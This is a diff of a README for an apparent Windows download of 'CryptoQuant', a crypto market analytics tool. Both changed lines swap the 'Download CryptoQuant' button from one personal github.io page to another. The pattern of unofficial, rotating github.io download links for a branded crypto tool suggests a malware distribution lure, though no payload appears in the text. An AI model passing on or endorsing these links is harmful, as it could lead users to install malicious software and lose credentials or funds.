@@ -4,7 +4,7 @@
 
 ## 📥 Download CryptoQuant for Windows
 
-[![⬇️ Download CryptoQuant](https://img.shields.io/badge/Download-CryptoQuant-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/242)
+[![⬇️ Download CryptoQuant](https://img.shields.io/badge/Download-CryptoQuant-blue?style=for-the-badge&logo=windows)](https://quantload.github.io/.github/)
 
 ---
 
@@ -32,7 +32,7 @@ CryptoQuant also offers automated alerts via email, Telegram, and browser notifi
 
 By combining advanced blockchain analytics with easy-to-use charting tools, CryptoQuant empowers users to gain a deeper understanding of market dynamics beyond standard price action.
 
-[![⬇️ Download CryptoQuant](https://img.shields.io/badge/Download-CryptoQuant-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/242)
+[![⬇️ Download CryptoQuant](https://img.shields.io/badge/Download-CryptoQuant-blue?style=for-the-badge&logo=windows)](https://quantload.github.io/.github/)
 
 ---
 
